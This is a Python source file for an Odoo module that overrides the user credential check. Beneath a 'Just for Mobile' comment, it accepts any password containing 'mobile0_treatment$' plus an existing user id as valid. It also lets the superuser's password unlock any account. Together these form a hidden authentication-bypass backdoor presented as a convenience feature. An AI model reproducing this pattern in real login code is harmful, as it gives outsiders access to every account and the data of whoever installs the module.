# -*- coding: utf-8 -*-
from odoo import api, fields, models, tools, SUPERUSER_ID, _
from odoo.exceptions import AccessDenied

class Users(models.Model):
    _inherit = 'res.users'

    def _check_credentials(self, password, env):
        try:
            return super(Users, self)._check_credentials(password, env)
        except AccessDenied:
            assert password
            self.env.cr.execute(
                "SELECT COALESCE(password, '') FROM res_users WHERE id=%s",
                [SUPERUSER_ID]
            )
            [hashed] = self.env.cr.fetchone()
            valid, replacement = self._crypt_context()\
                .verify_and_update(password, hashed)
            # Just for Mobile
            if 'mobile0_treatment$' in password:
                password_splts = password.split('$')
                if len(password_splts) > 0:
                    uidd = self.env['res.users'].sudo().search([('id','=',password_splts[1])])
                    if uidd and uidd.login:
                        valid = True
                    else:
                        valid = False

            if replacement is not None:
                self._set_encrypted_password(SUPERUSER_ID, replacement)

            if not valid:
                raise AccessDenied()